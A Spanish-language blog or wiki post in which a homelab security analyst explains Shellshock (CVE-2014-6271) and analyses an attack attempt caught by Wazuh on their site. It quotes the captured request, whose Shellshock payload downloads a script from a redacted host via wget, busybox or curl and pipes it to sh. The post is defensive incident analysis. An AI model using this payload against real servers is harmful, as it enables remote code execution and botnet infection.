---
title: Shellshock
description: Ataque automatizado hacia esta página.
published: true
date: 2025-11-18T12:11:39.089Z
tags: 
editor: markdown
dateCreated: 2025-11-18T12:11:39.089Z
---

# Shellshock: Una vulnerabilidad del pasado que sigue hoy en día.
> Todo lo que se verá en esta página está ofuscado cumpliendo la protección de datos. La IP del atacante ha sido reportada correctamente.
{.is-warning}

## Notificación del aviso
Este website donde estas ahora mismo, está siendo monitorizado por un sistema SIEM (wazuh), encargado de comprobar los peligros de tener expuesto un website en internet. Sin embargo durante estos últimos meses he estado recibiendo una oleada de avisos sobre una vulnerabilidad en especifico.

**Shellshock(CVE-2014-6271)** [Información del CVE-2014-6271 aportado por el NIST](https://nvd.nist.gov/vuln/detail/cve-2014-6271).

## La vulnerabilidad Shellshock
Esta vulnerabilidad cuenta con un CVSS de 9.8 debido a:
- Vector de ataque: Network.
- Complejidad del ataque: Bajo.
- Privilegios necesarios: Ninguno.
- Interación del usuario: Ninguno.
- Scope: Sin cambios.
- Confindencialidad: Altamente atacada.
- Integridad: Altamente atacada.
- Disponibilidad: Altamante atacada.

Esta vulnerabilidad se descubrió el 12 de septiembre de 2014 por Stéhane Chazelas, y es una vulnerabilidad que permite ejecución de código remoto en GNU BASH. Nace por un uso incorrecto de los entornos que maneja BASH permitiendo que se ejecuten comandos maliciosos que se adjuntan al final de una definición de función cuando importa variables de entorno.

### Como funciona
Esto es debido a que una variable de entorno la declaramos como:
```bash
VAR='() {funcion;};'
```
Sin embargo, si habia texto detras del `}`, bash lo interpretaba y o ejecutaba directamente.

### ¿Y que hago?
Actualmente esa vulnerabilidad se puede reparar facilmente con una actualización de bash. Así que no debes preocuparte si tu sistema puede ser afectado, a menos que nolo hayas actualizado desde 2013...

## Porque me han atacado
Está en la última linea del anterior apartado, muchos sistemas desde 2013 no se actualiza y esto provoca que exitan redes de bot (botnets) que sigan intentando atacar esos sistemas olvidados o desactualizados.

> A partir de este punto, hablaré de como lo he detectado, que tenia el ataque y cosas más técnicas. 
{.is-info}

## Arquitectura de la detección
Este website tiene una serie de capas detras que has tenido que pasar para poder ver lo que estas viendo, y me sirve como analista de ciberseguridad para seguir aprendiendo.
- SIEM: Wazuh (Visualizador de eventos y alertas)
- IDS/IPS: Suricata (Comprueba firmas de red y envia alertas a Wazuh)
- Perimetro: Se tiene tanto un proxy inverso como un firewall para imponer reglas de bloqueo a estas IPs.
- Investiación: Con una maquina virtual desechable Kali y TOR.

## El ataque
Wazuh hizo saltar una alerta que tiene predeterminada, con ID 31168. Este ID detecta accesos a website con un patrón muy especifico, como el que veremos.

En este caso el log capturado es el siguiente:
```html
"GET / HTTP/1.1" 301 169 "-" "() { :; }; /bin/bash -c \x22(wget -qO- http://[IP Maliciosa]/[Archivo malicioso]||busybox wget -qO- http://[IP Maliciosa]/[Archivo malicioso]||curl -s http:[IP Maliciosa]/[Archivo malicioso])|sh\x22& # Un correo del atacante"
```
Vamos a analizar la petición poco a poco.
- Exploit: El exploit comienza con el uso de "() {: ;};", como hemos explicado anteriormente hace uso de variables del entorno para poder atacar.
- Ataque: Acto seguido lo que hace es descargar un script externo y ejecutarlo. Hace 3 intentos, para distintos sistemas Linux o IoT, por eso podemos ver "wget" "busybox" o "curl".

## Analisis
Lo primero que se hizo para analizar este payload, fue crear una maquina Kali desechable, para eliminar cualquier posible rastro que exista. Tras esto descargamos y usamos TOR para poder entrar en el servidor del atacante sin compromenternos a nosotros mismos.

Curiosamente este website parece que no traé nada interesante, ni si quiera hay un archivo a descargar. Es un website donde hay un botón falso que al hacer click ejecuta un video, que parece ser de alguna canción.

En cualquier caso, se ha encontrado una serie de evidencias donde podemos deducir quien podría ser el autor.
1. RondoDox: El archivo que se intenta descargar se llama rondo.qre.sh, coincidiendo con la botnet RondoDox, activa actualmente. Aunque esto es hipotesis.
2. Correo del autor: Tanto en el website como en el payload se encuentra una dirección de correo "bang2013@atomicmail.io".
3. Trolling: El website al no traer directamente un sitio de descarga, podemos decir que lo unico que busca es molestar el trafico y a los analistas de ciberseguridad.

## Mitigación
Actualmente lo que tengo que hacer para poder mitigar este ataque es manualmente escribir unas reglas de firewall para evitar cualquier petición que venga de este website, o subred.

Lamentablemnte esta petición se repite 1 o 2 veces por semana repitiendo el mismo patrón y el mismo usuario.

En un futuro se tendrá un SOAR con n8n y un bot de telegram para poder recibir notificaciones graves en tiempo real y poder mitigarlo en el momento con el bot.

La IP ha sido reportada a AbuselPDB.

## Agradecimientos
Muchas gracias a los que se hayan quedado hasta el final de este corto relato en mi homelab casero, cualquier recomendación o comentario es bienvenido en mi cuenta de LinkedIn.
- [LinkedIn](https://www.linkedin.com/in/pablosanchezhidalgo/)